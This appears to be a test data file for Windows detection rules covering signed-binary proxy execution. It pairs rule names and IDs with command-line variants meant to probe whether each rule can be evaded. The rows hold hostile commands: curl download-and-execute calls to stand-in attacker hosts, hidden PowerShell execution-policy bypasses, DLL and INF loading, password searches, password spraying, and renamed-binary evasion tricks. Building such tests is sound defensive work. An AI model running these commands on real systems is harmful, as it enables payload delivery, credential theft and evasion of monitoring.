Technical	Rule_name	Title	Rule_id	Command_match_rule	Commandline_evasion	Excutable	Bypass target rule	Bypass all rule	Trigger rule
t1218	proc_creation_win_addinutil_uncommon_cmdline	Uncommon AddinUtil.EXE CommandLine Execution	4f2cd9b6-4a17-440f-bb2a-687abb65993a		AddInUtil.exe /AddInRoot:C:\\Users\\Public\\Payload	FALSE	FALSE	FALSE	
t1218	proc_creation_win_addinutil_uncommon_cmdline	Uncommon AddinUtil.EXE CommandLine Execution	4f2cd9b6-4a17-440f-bb2a-687abb65993a		AddInUtil.exe -AddInRoot:C:\\Users\\Public\\Payload\	FALSE	FALSE	FALSE	
t1218	proc_creation_win_agentexecutor_potential_abuse	AgentExecutor PowerShell Execution	7efd2c8d-8b18-45b7-947d-adfe9ed04f61		AgentExecutor.exe -powershell script.ps1 C:\out.txt C:\err.txt C:\timeout.txt 60000 C:\Windows\System32\WindowsPowerShell\v1.0\ 0 0	FALSE	FALSE	FALSE	
t1218	proc_creation_win_agentexecutor_potential_abuse	AgentExecutor PowerShell Execution	7efd2c8d-8b18-45b7-947d-adfe9ed04f61		"copy powershell.exe AgentExecutor.exe && AgentExecutor.exe -Command ""Write-Output 'Bypassed'"""	FALSE	FALSE	FALSE	
t1218	proc_creation_win_agentexecutor_potential_abuse	AgentExecutor PowerShell Execution	7efd2c8d-8b18-45b7-947d-adfe9ed04f61		AgentExecutor.exe -powershell script.ps1 C:\out.txt C:\err.txt C:\timeout.txt 60000 C:\Windows\System32\WindowsPowerShell\v1.0\ 0	FALSE	FALSE	FALSE	
t1218	proc_creation_win_certoc_load_dll	DLL Loaded via CertOC.EXE	242301bc-f92f-4476-8718-78004a6efd9f		certoc.exe -loaddll malicious.dll	FALSE	FALSE	FALSE	
t1218	proc_creation_win_certoc_load_dll	DLL Loaded via CertOC.EXE	242301bc-f92f-4476-8718-78004a6efd9f		certoc.exe -LoadDLL malicious.dll	FALSE	FALSE	FALSE	
t1218	proc_creation_win_certoc_load_dll	DLL Loaded via CertOC.EXE	242301bc-f92f-4476-8718-78004a6efd9f		"certoc.exe -loaddll"" malicious.dll"	FALSE	FALSE	FALSE	
t1218	proc_creation_win_certoc_load_dll	DLL Loaded via CertOC.EXE	242301bc-f92f-4476-8718-78004a6efd9f		certoc.exe -loaddll  malicious.dll	FALSE	FALSE	FALSE	
t1218	proc_creation_win_certoc_load_dll	DLL Loaded via CertOC.EXE	242301bc-f92f-4476-8718-78004a6efd9f		certoc.exe ^-loaddll malicious.dll	FALSE	FALSE	FALSE	
t1218	proc_creation_win_certoc_load_dll	DLL Loaded via CertOC.EXE	242301bc-f92f-4476-8718-78004a6efd9f		certoc.exe -loaddll .\malicious.dll	FALSE	FALSE	FALSE	
t1218	proc_creation_win_certoc_load_dll	DLL Loaded via CertOC.EXE	242301bc-f92f-4476-8718-78004a6efd9f		certoc.exe -loaddll C:\Windows\System32\malicious.dll	FALSE	FALSE	FALSE	
t1218	proc_creation_win_certoc_load_dll	DLL Loaded via CertOC.EXE	242301bc-f92f-4476-8718-78004a6efd9f		certoc.exe -loaddll malicious	FALSE	FALSE	FALSE	
t1218	proc_creation_win_cmd_curl_download_exec_combo	Curl Download And Execute Combination	21dd6d38-2b18-4453-9404-a0fe4a0cc288		cmd.exe /c curl.exe http://example.com/payload.exe -o payload.exe & .\payload.exe	FALSE	FALSE	FALSE	
t1218	proc_creation_win_cmd_curl_download_exec_combo	Curl Download And Execute Combination	21dd6d38-2b18-4453-9404-a0fe4a0cc288		cmd.exe /c curl http://example.com/payload.exe > payload.exe & payload.exe	FALSE	FALSE	FALSE	
t1218	proc_creation_win_cmd_curl_download_exec_combo	Curl Download And Execute Combination	21dd6d38-2b18-4453-9404-a0fe4a0cc288		"powershell.exe -Command ""curl http://example.com/payload.exe -o payload.exe ; .\payload.exe"""	FALSE	FALSE	FALSE	
t1218	proc_creation_win_cmd_curl_download_exec_combo	Curl Download And Execute Combination	21dd6d38-2b18-4453-9404-a0fe4a0cc288		curl --url http://attacker.com/script.bat --out script.bat && script.bat	FALSE	FALSE	FALSE	
t1218	proc_creation_win_cmd_curl_download_exec_combo	Curl Download And Execute Combination	21dd6d38-2b18-4453-9404-a0fe4a0cc288		curl -s http://attacker.com/payload.ps1 --output payload.ps1 ; powershell -ExecutionPolicy Bypass -File payload.ps1	FALSE	FALSE	FALSE	
t1218	proc_creation_win_cmd_curl_download_exec_combo	Curl Download And Execute Combination	21dd6d38-2b18-4453-9404-a0fe4a0cc288		curl -sL http://attacker.com/payload.exe -O && payload.exe	FALSE	FALSE	FALSE	
t1218	proc_creation_win_cmd_curl_download_exec_combo	Curl Download And Execute Combination	21dd6d38-2b18-4453-9404-a0fe4a0cc288		curl http://attacker.com/payload.exe -o payload.exe && payload.exe	FALSE	FALSE	FALSE	
t1218	proc_creation_win_cmd_curl_download_exec_combo	Curl Download And Execute Combination	21dd6d38-2b18-4453-9404-a0fe4a0cc288		curl http://attacker.com/payload.exe -o payload.exe & .\payload.exe	FALSE	FALSE	FALSE	
t1218	proc_creation_win_cmd_curl_download_exec_combo	Curl Download And Execute Combination	21dd6d38-2b18-4453-9404-a0fe4a0cc288		curl http://attacker.com/payload.exe -o payload.exe & payload.exe	FALSE	FALSE	FALSE	
t1218	proc_creation_win_cmd_curl_download_exec_combo	Curl Download And Execute Combination	21dd6d38-2b18-4453-9404-a0fe4a0cc288		curl http://attacker.com/payload.exe -o p.exe & p.exe	FALSE	FALSE	FALSE	
t1218	proc_creation_win_cmdl32_arbitrary_file_download	Potential Arbitrary File Download Via Cmdl32.EXE	f37aba28-a9e6-4045-882c-d5004043b337		"cmdl32.exe ""/vpn"" ""/lan"" C:\path\to\config.txt"	FALSE	FALSE	FALSE	
t1218	proc_creation_win_cmdl32_arbitrary_file_download	Potential Arbitrary File Download Via Cmdl32.EXE	f37aba28-a9e6-4045-882c-d5004043b337		cmdl32.exe -vpn -lan C:\path\to\config.txt	FALSE	FALSE	FALSE	
t1218	proc_creation_win_cmdl32_arbitrary_file_download	Potential Arbitrary File Download Via Cmdl32.EXE	f37aba28-a9e6-4045-882c-d5004043b337		cmdl32.exe /lan /vpn C:\path\to\config.txt	FALSE	FALSE	FALSE	
t1218	proc_creation_win_cmdl32_arbitrary_file_download	Potential Arbitrary File Download Via Cmdl32.EXE	f37aba28-a9e6-4045-882c-d5004043b337		cmdl32.exe /vpn /lan C:\path\to\config.txt	FALSE	FALSE	FALSE	
t1218	proc_creation_win_cmdl32_arbitrary_file_download	Potential Arbitrary File Download Via Cmdl32.EXE	f37aba28-a9e6-4045-882c-d5004043b337		copy cmdl32.exe not_an_exploit.exe && not_an_exploit.exe /vpn /lan C:\path\to\config.txt	FALSE	FALSE	FALSE	
t1218	proc_creation_win_diskshadow_script_mode_susp_ext	Diskshadow Script Mode - Uncommon Script Extension Execution	1dde5376-a648-492e-9e54-4241dd9b0c7f		"diskshadow.exe -s ""C:\temp\payload.txt"""	FALSE	FALSE	FALSE	
t1218	proc_creation_win_diskshadow_script_mode_susp_ext	Diskshadow Script Mode - Uncommon Script Extension Execution	1dde5376-a648-492e-9e54-4241dd9b0c7f		diskshadow.exe -s C:\temp\payload   .txt	FALSE	FALSE	FALSE	
t1218	proc_creation_win_diskshadow_script_mode_susp_ext	Diskshadow Script Mode - Uncommon Script Extension Execution	1dde5376-a648-492e-9e54-4241dd9b0c7f		diskshadow.exe /s C:\temp\payload.`txt	FALSE	FALSE	FALSE	
t1218	proc_creation_win_diskshadow_script_mode_susp_ext	Diskshadow Script Mode - Uncommon Script Extension Execution	1dde5376-a648-492e-9e54-4241dd9b0c7f		diskshadow.exe -s C:\temp\payload.txt	FALSE	FALSE	FALSE	
t1218	proc_creation_win_diskshadow_script_mode_susp_location	Diskshadow Script Mode - Execution From Potential Suspicious Location	fa1a7e52-3d02-435b-81b8-00da14dd66c1		diskshadow.exe /s C:\Users\Public\script.txt	FALSE	FALSE	FALSE	
t1218	proc_creation_win_diskshadow_script_mode_susp_location	Diskshadow Script Mode - Execution From Potential Suspicious Location	fa1a7e52-3d02-435b-81b8-00da14dd66c1		diskshadow.exe -s C:\Users\Public\script.txt	FALSE	FALSE	FALSE	
t1218	proc_creation_win_diskshadow_script_mode_susp_location	Diskshadow Script Mode - Execution From Potential Suspicious Location	fa1a7e52-3d02-435b-81b8-00da14dd66c1		diskshadow.exe /s C:\Users\Public\..\Public\script.txt	FALSE	FALSE	FALSE	
t1218	proc_creation_win_diskshadow_script_mode_susp_location	Diskshadow Script Mode - Execution From Potential Suspicious Location	fa1a7e52-3d02-435b-81b8-00da14dd66c1		"diskshadow.exe /s ""C:\Users\Public\script.txt"""	FALSE	FALSE	FALSE	
t1218	proc_creation_win_diskshadow_script_mode_susp_location	Diskshadow Script Mode - Execution From Potential Suspicious Location	fa1a7e52-3d02-435b-81b8-00da14dd66c1		set SCRIPT_PATH=C:\Users\Public\script.txt && diskshadow.exe /s %SCRIPT_PATH%	FALSE	FALSE	FALSE	
t1218	proc_creation_win_diskshadow_script_mode_susp_location	Diskshadow Script Mode - Execution From Potential Suspicious Location	fa1a7e52-3d02-435b-81b8-00da14dd66c1		diskshadow.exe /s C:\Users\Public\script.txt && echo dummy	FALSE	FALSE	FALSE	
t1218	proc_creation_win_diskshadow_script_mode_susp_location	Diskshadow Script Mode - Execution From Potential Suspicious Location	fa1a7e52-3d02-435b-81b8-00da14dd66c1		"diskshadow.exe /s C:\Users\Public\script.txt | findstr /v """""	FALSE	FALSE	FALSE	
t1218	proc_creation_win_dotnet_trace_lolbin_execution	Binary Proxy Execution Via Dotnet-Trace.EXE	9257c05b-4a4a-48e5-a670-b7b073cf401b		dotnet-trace collect -- calc.exe	FALSE	FALSE	FALSE	
t1218	proc_creation_win_dsacls_password_spray	Potential Password Spraying Attempt Using Dsacls.EXE	bac9fb54-2da7-44e9-988f-11e9a5edbc0c		dsacls.exe /U:admin /P:Password123	FALSE	FALSE	FALSE	
t1218	proc_creation_win_dsacls_password_spray	Potential Password Spraying Attempt Using Dsacls.EXE	bac9fb54-2da7-44e9-988f-11e9a5edbc0c		dsacls.exe /user:admin /passwd:Password123	FALSE	FALSE	FALSE	
t1218	proc_creation_win_dsacls_password_spray	Potential Password Spraying Attempt Using Dsacls.EXE	bac9fb54-2da7-44e9-988f-11e9a5edbc0c		"dsacls.exe /user:admin ""/passwd:Password123"""	FALSE	FALSE	FALSE	
t1218	proc_creation_win_dsacls_password_spray	Potential Password Spraying Attempt Using Dsacls.EXE	bac9fb54-2da7-44e9-988f-11e9a5edbc0c		set P=/passwd: && dsacls.exe /user:admin %P%Password123	FALSE	FALSE	FALSE	
t1218	proc_creation_win_dsacls_password_spray	Potential Password Spraying Attempt Using Dsacls.EXE	bac9fb54-2da7-44e9-988f-11e9a5edbc0c		dsacls.exe /user:admin /passwd:Password123 /	FALSE	FALSE	FALSE	
t1218	proc_creation_win_dxcap_arbitrary_binary_execution	New Capture Session Launched Via DXCap.EXE	60f16a96-db70-42eb-8f76-16763e333590		DXCap.exe -c calc.exe	FALSE	FALSE	FALSE	
t1218	proc_creation_win_dxcap_arbitrary_binary_execution	New Capture Session Launched Via DXCap.EXE	60f16a96-db70-42eb-8f76-16763e333590		DXCap.exe -c calc .exe	FALSE	FALSE	FALSE	
t1218	proc_creation_win_dxcap_arbitrary_binary_execution	New Capture Session Launched Via DXCap.EXE	60f16a96-db70-42eb-8f76-16763e333590		DXCap.exe -c calc.exe -v	FALSE	FALSE	FALSE	
t1218	proc_creation_win_dxcap_arbitrary_binary_execution	New Capture Session Launched Via DXCap.EXE	60f16a96-db70-42eb-8f76-16763e333590		DXCap.exe -c calc.exe -	FALSE	FALSE	FALSE	
t1218	proc_creation_win_dxcap_arbitrary_binary_execution	New Capture Session Launched Via DXCap.EXE	60f16a96-db70-42eb-8f76-16763e333590		DXCap.exe -c calc.exe -v -c notepad.exe	FALSE	FALSE	FALSE	
t1218	proc_creation_win_expand_cabinet_files	Potentially Suspicious Cabinet File Expansion	9f107a84-532c-41af-b005-8d12a607639f		expand.exe /F:* C:\Users\Public\test.cab C:\Windows\Temp\	FALSE	FALSE	FALSE	
t1218	proc_creation_win_expand_cabinet_files	Potentially Suspicious Cabinet File Expansion	9f107a84-532c-41af-b005-8d12a607639f		expand.exe -F:* C:\Windows\Temp\test.cab C:\Users\Administrator\AppData\Local\Temp\	FALSE	FALSE	FALSE	
t1218	proc_creation_win_expand_cabinet_files	Potentially Suspicious Cabinet File Expansion	9f107a84-532c-41af-b005-8d12a607639f		expand.exe /F:* C:\AppData\Roaming\test.cab C:\Windows\System32\	FALSE	FALSE	FALSE	
t1218	proc_creation_win_expand_cabinet_files	Potentially Suspicious Cabinet File Expansion	9f107a84-532c-41af-b005-8d12a607639f		expand.exe -F:* C:\C$\test.cab C:\Windows\Temp\	FALSE	FALSE	FALSE	
t1218	proc_creation_win_findstr_download	Remote File Download Via Findstr.EXE	587254ee-a24b-4335-b3cd-065c0f1f4baa		"findstr /v /l . ""\\192.168.1.100\share\payload.txt"""	FALSE	FALSE	FALSE	
t1218	proc_creation_win_findstr_download	Remote File Download Via Findstr.EXE	587254ee-a24b-4335-b3cd-065c0f1f4baa		"findstr -v -l . ""\\192\.168\.1\.100\share\payload.txt"""	FALSE	FALSE	FALSE	
t1218	proc_creation_win_findstr_download	Remote File Download Via Findstr.EXE	587254ee-a24b-4335-b3cd-065c0f1f4baa		"findstr -v -l . ""\\192.168.1.100\share\payload.txt"" > NUL"	FALSE	FALSE	FALSE	
t1218	proc_creation_win_findstr_download	Remote File Download Via Findstr.EXE	587254ee-a24b-4335-b3cd-065c0f1f4baa		"findstr -v -l . ""\\192.168.1.100\share\payload.txt"" | findstr ."	FALSE	FALSE	FALSE	
t1218	proc_creation_win_findstr_download	Remote File Download Via Findstr.EXE	587254ee-a24b-4335-b3cd-065c0f1f4baa		"findstr -v -l . ""\\192.168.1.100\share\payload.txt"" && echo Done"	FALSE	FALSE	FALSE	
t1218	proc_creation_win_findstr_download	Remote File Download Via Findstr.EXE	587254ee-a24b-4335-b3cd-065c0f1f4baa		"findstr -v -l . ""\\192.168.1.100\share\payload.txt"" ^| more"	FALSE	FALSE	FALSE	
t1218	proc_creation_win_findstr_download	Remote File Download Via Findstr.EXE	587254ee-a24b-4335-b3cd-065c0f1f4baa		"findstr -v -l . ""\\192.168.1.100\share\payload.txt"" ^>^> NUL"	FALSE	FALSE	FALSE	
t1218	proc_creation_win_findstr_download	Remote File Download Via Findstr.EXE	587254ee-a24b-4335-b3cd-065c0f1f4baa		"findstr -v -l . ""\\192.168.1.100\share\payload.txt"" ^< NUL"	FALSE	FALSE	FALSE	
t1218	proc_creation_win_findstr_download	Remote File Download Via Findstr.EXE	587254ee-a24b-4335-b3cd-065c0f1f4baa		"findstr -v -l . ""\\192.168.1.100\share\payload.txt"" ^<^> NUL"	FALSE	FALSE	FALSE	
t1218	proc_creation_win_findstr_download	Remote File Download Via Findstr.EXE	587254ee-a24b-4335-b3cd-065c0f1f4baa		"findstr -v -l . ""\\192.168.1.100\share\payload.txt"" ^| findstr /m ."	FALSE	FALSE	FALSE	
t1218	proc_creation_win_findstr_subfolder_search	Insensitive Subfolder Search Via Findstr.EXE	04936b66-3915-43ad-a8e5-809eadfd1141		"findstr /s /i ""password"" C:\*.txt"	FALSE	FALSE	FALSE	
t1218	proc_creation_win_findstr_subfolder_search	Insensitive Subfolder Search Via Findstr.EXE	04936b66-3915-43ad-a8e5-809eadfd1141		"findstr /s/i ""password"" C:\*.txt"	FALSE	FALSE	FALSE	
t1218	proc_creation_win_findstr_subfolder_search	Insensitive Subfolder Search Via Findstr.EXE	04936b66-3915-43ad-a8e5-809eadfd1141		"findstr -s -i ""password"" C:\*.txt"	FALSE	FALSE	FALSE	
t1218	proc_creation_win_findstr_subfolder_search	Insensitive Subfolder Search Via Findstr.EXE	04936b66-3915-43ad-a8e5-809eadfd1141		"findstr -si ""password"" C:\*.txt"	FALSE	FALSE	FALSE	
t1218	proc_creation_win_findstr_subfolder_search	Insensitive Subfolder Search Via Findstr.EXE	04936b66-3915-43ad-a8e5-809eadfd1141		"findstr /S /I ""password"" C:\*.txt"	FALSE	FALSE	FALSE	
t1218	proc_creation_win_findstr_subfolder_search	Insensitive Subfolder Search Via Findstr.EXE	04936b66-3915-43ad-a8e5-809eadfd1141		"findstr.exe /s /i ""password"" C:\*.txt"	FALSE	FALSE	FALSE	
t1218	proc_creation_win_findstr_subfolder_search	Insensitive Subfolder Search Via Findstr.EXE	04936b66-3915-43ad-a8e5-809eadfd1141		"cmd.exe /c findstr /s /i ""password"" C:\*.txt"	FALSE	FALSE	FALSE	
t1218	proc_creation_win_findstr_subfolder_search	Insensitive Subfolder Search Via Findstr.EXE	04936b66-3915-43ad-a8e5-809eadfd1141		"copy findstr.exe grep.exe && grep.exe /s /i ""password"" C:\*.txt"	FALSE	FALSE	FALSE	
t1218	proc_creation_win_findstr_subfolder_search	Insensitive Subfolder Search Via Findstr.EXE	04936b66-3915-43ad-a8e5-809eadfd1141		"copy findstr.exe fstr.exe && fstr.exe /s /i ""password"" ."	FALSE	FALSE	FALSE	
t1218	proc_creation_win_findstr_subfolder_search	Insensitive Subfolder Search Via Findstr.EXE	04936b66-3915-43ad-a8e5-809eadfd1141		"findstr ""password"" . /s /i"	FALSE	FALSE	FALSE	
t1218	proc_creation_win_hktl_zipexec	Suspicious ZipExec Execution	90dcf730-1b71-4ae7-9ffc-6fcf62bd0132		"powershell.exe -ExecutionPolicy Bypass -WindowStyle Hidden -Command ""Expand-Archive -Path 'C:\Temp\payload.zip' -DestinationPath 'C:\Temp\extracted' -Force; Start-Process 'binary.exe'"""	FALSE	FALSE	FALSE	
t1218	proc_creation_win_hktl_zipexec	Suspicious ZipExec Execution	90dcf730-1b71-4ae7-9ffc-6fcf62bd0132		powershell -ep Bypass -w Hidden -Command {Expand-Archive -Path 'C:\Temp\payload.zip' -DestinationPath 'C:\Temp\extracted' -Force; Start-Process 'binary.exe'}	FALSE	FALSE	FALSE	
t1218	proc_creation_win_hktl_zipexec	Suspicious ZipExec Execution	90dcf730-1b71-4ae7-9ffc-6fcf62bd0132		powershell.exe -ExecutionPolicy Bypass -WindowStyle Hidden -Command Expand-Archive -Path 'C:\Temp\payload.zip' -DestinationPath 'C:\Temp\extracted' -Force; Start-Process 'binary.exe'	FALSE	FALSE	FALSE	
t1218	proc_creation_win_iexpress_susp_execution	Self Extracting Package Creation Via Iexpress.EXE From Potentially Suspicious Location	b2b048b0-7857-4380-b0fb-d3f0ab820b71		"iexpress.exe /n /q /m ""C:\\Users\\Public\\Documents\\config.sed"""	FALSE	FALSE	FALSE	
t1218	proc_creation_win_iexpress_susp_execution	Self Extracting Package Creation Via Iexpress.EXE From Potentially Suspicious Location	b2b048b0-7857-4380-b0fb-d3f0ab820b71		iexpress.exe /n/q/m C:\\Windows\\Temp\\config.sed	FALSE	FALSE	FALSE	
t1218	proc_creation_win_iexpress_susp_execution	Self Extracting Package Creation Via Iexpress.EXE From Potentially Suspicious Location	b2b048b0-7857-4380-b0fb-d3f0ab820b71		iexpress.exe /n /q /m C:\\Users\\Public\\Documents\\config.sed	FALSE	FALSE	FALSE	
t1218	proc_creation_win_imewbdld_download	Arbitrary File Download Via IMEWDBLD.EXE	863218bd-c7d0-4c52-80cd-0a96c09f54af		"""C:\\WINDOWS\\System32\\IME\\SHARED\\IMEWDBLD.exe"" https://raw.githubusercontent.com/redcanaryco/atomic-red-team/master/atomics/T1105/T1105.yaml"	FALSE	FALSE	FALSE	
t1218	proc_creation_win_imewbdld_download	Arbitrary File Download Via IMEWDBLD.EXE	863218bd-c7d0-4c52-80cd-0a96c09f54af		copy IMEWDBLD.exe not_a_downloader.exe && not_a_downloader.exe http://attacker.com/payload.exe	FALSE	FALSE	FALSE	
t1218	proc_creation_win_imewbdld_download	Arbitrary File Download Via IMEWDBLD.EXE	863218bd-c7d0-4c52-80cd-0a96c09f54af		"imewdbld.exe ""h""tt""payload.exe"""	FALSE	FALSE	FALSE	
t1218	proc_creation_win_imewbdld_download	Arbitrary File Download Via IMEWDBLD.EXE	863218bd-c7d0-4c52-80cd-0a96c09f54af		imewdbld.exe ftattacker.com/payload.exe	FALSE	FALSE	FALSE	
t1218	proc_creation_win_infdefaultinstall_execute_sct_scripts	InfDefaultInstall.exe .inf Execution	ce7cf472-6fcc-490a-9481-3786840b5d9b		InfDefaultInstall.exe C:\path\to\malicious.inf	FALSE	FALSE	FALSE	
t1218	proc_creation_win_infdefaultinstall_execute_sct_scripts	InfDefaultInstall.exe .inf Execution	ce7cf472-6fcc-490a-9481-3786840b5d9b		"InfDefaultInstall.exe  ""C:\path\to\malicious.inf"""	FALSE	FALSE	FALSE	
t1218	proc_creation_win_infdefaultinstall_execute_sct_scripts	InfDefaultInstall.exe .inf Execution	ce7cf472-6fcc-490a-9481-3786840b5d9b		InfDefaultInstall.exe C:\path\to\malicious.INF	FALSE	FALSE	FALSE	
t1218	proc_creation_win_infdefaultinstall_execute_sct_scripts	InfDefaultInstall.exe .inf Execution	ce7cf472-6fcc-490a-9481-3786840b5d9b		InfDefaultInstall.exe C:\path\to\malicious.inf.txt	FALSE	FALSE	FALSE	
t1218	proc_creation_win_infdefaultinstall_execute_sct_scripts	InfDefaultInstall.exe .inf Execution	ce7cf472-6fcc-490a-9481-3786840b5d9b		copy InfDefaultInstall.exe not_suspicious.exe && not_suspicious.exe C:\path\to\malicious.inf	FALSE	FALSE	FALSE	
t1218	proc_creation_win_ldifde_file_load	Import LDAP Data Interchange Format File Via Ldifde.EXE	6f535e01-ca1f-40be-ab8d-45b19c0c8b7f		ldifde.exe -i -f http://example.com/payload.ldf	FALSE	FALSE	FALSE	
t1218	proc_creation_win_ldifde_file_load	Import LDAP Data Interchange Format File Via Ldifde.EXE	6f535e01-ca1f-40be-ab8d-45b19c0c8b7f		ldifde.exe /i /f C:\path\to\file.ldf	FALSE	FALSE	FALSE	
t1218	proc_creation_win_ldifde_file_load	Import LDAP Data Interchange Format File Via Ldifde.EXE	6f535e01-ca1f-40be-ab8d-45b19c0c8b7f		copy ldifde.exe not_suspicious.exe && not_suspicious.exe /i /f http://attacker.com/payload.ldf	FALSE	FALSE	FALSE	
t1218	proc_creation_win_ldifde_file_load	Import LDAP Data Interchange Format File Via Ldifde.EXE	6f535e01-ca1f-40be-ab8d-45b19c0c8b7f		"ldifde.exe -i -f ""http://attacker.com/payload.ldf"" -u"	FALSE	FALSE	FALSE	
t1218	proc_creation_win_ldifde_file_load	Import LDAP Data Interchange Format File Via Ldifde.EXE	6f535e01-ca1f-40be-ab8d-45b19c0c8b7f		ldifde.exe /i /f http://attacker.com/payload.ldf	FALSE	FALSE	FALSE	
